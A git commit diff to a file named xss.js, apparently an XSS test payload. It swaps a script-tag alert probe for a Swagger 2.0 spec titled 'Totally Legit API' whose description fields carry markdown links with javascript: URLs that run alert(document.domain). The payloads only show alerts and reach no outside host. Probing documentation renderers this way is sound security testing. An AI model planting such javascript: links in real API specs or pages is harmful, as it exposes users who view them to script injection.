8593745b047d5e33dcaf811f33c22f7677ab272c
golotinanton8-eng <golotinanton8@gmail.com>
2026-09-22 11:28:43 +0300

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,24 @@
-<script>alert(document.domain)</script>
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "Totally Legit API",
+    "description": "[Click here for docs](javascript:alert%28document.domain%29)",
+    "version": "1.0"
+  },
+  "host": "example.com",
+  "basePath": "/",
+  "schemes": ["https"],
+  "paths": {
+    "/test": {
+      "get": {
+        "summary": "Test endpoint",
+        "description": "[More info](javascript:alert%28'XSS'%29)",
+        "responses": {
+          "200": {
+            "description": "OK"
+          }
+        }
+      }
+    }
+  }
+}
